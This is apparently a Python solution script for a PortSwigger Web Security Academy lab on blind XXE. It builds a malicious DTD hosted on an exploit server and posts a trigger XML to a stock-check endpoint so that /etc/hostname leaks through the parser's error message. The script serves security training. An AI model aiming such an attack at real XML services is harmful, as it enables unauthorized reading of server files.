"""
Lab 6: Exploiting blind XXE to retrieve data via error messages
https://portswigger.net/web-security/xxe/blind/lab-xxe-triggering-error-message-containing-sensitive-data
Difficulty: Practitioner

📝 Same two-stage shape as Lab 5, but the hosted DTD deliberately causes a
PARSE ERROR whose message contains the file content — no Collaborator
needed, read it straight from the HTTP response/error.
"""

from utils import get_session, log, note, build_error_based_dtd_file, build_malicious_dtd_trigger

TARGET = "https://YOUR-LAB-ID.web-security-academy.net"
STOCK_CHECK_PATH = "/product/stock"
EXPLOIT_SERVER = "https://exploit-YOUR-LAB-ID.exploit-server.net"
FILE_TO_READ = "/etc/hostname"


def run():
    s = get_session()

    dtd_content = build_error_based_dtd_file(FILE_TO_READ)
    out_path = "exploit.dtd"
    with open(out_path, "w") as f:
        f.write(dtd_content)
    log(f"Wrote malicious DTD to {out_path}")
    note(f"Host this at {EXPLOIT_SERVER}/exploit.dtd BEFORE sending the trigger below.")

    trigger_xml = build_malicious_dtd_trigger(f"{EXPLOIT_SERVER}/exploit.dtd")
    note(f"Trigger payload:\n{trigger_xml}")

    r = s.post(f"{TARGET}{STOCK_CHECK_PATH}", data=trigger_xml.encode(),
                headers={"Content-Type": "application/xml"})
    log(f"Response status: {r.status_code}")
    print(r.text)

    note("The file content should appear INSIDE the parser's error message")
    note("in the response body above — no OOB listener needed for this one.")


if __name__ == "__main__":
    run()
